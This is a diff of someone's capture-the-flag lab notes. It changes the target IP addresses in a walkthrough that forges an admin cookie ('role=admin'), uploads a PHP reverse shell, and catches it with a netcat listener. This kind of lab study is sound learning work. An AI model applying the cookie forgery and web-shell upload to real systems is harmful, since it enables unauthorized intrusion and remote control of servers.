@@ -1,4 +1,4 @@
-http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads
+http://10.129.161.165/cdn-cgi/login/admin.php?content=uploads
 
 Catch with burp and change the cookie:
 Cookie: user=34322; role=admin
@@ -6,7 +6,7 @@ Cookie: user=34322; role=admin
 ![[uploadWebShell.png]]
 
 ## Navigate to the shell
-10.129.95.191/uploads/php-reverse-shell.php
+10.129.161.165/uploads/php-reverse-shell.php
 Modify the cookie entry.
 ## Connecting to listener on attacker
 ```
@@ -42,3 +42,5 @@ zsh: suspended  nc -lvnp 1337
                                export Term=xterm
 
 ```
+
+TOO: Try and get a more interactive shell without crashing it (autocomplete, arrow keys).
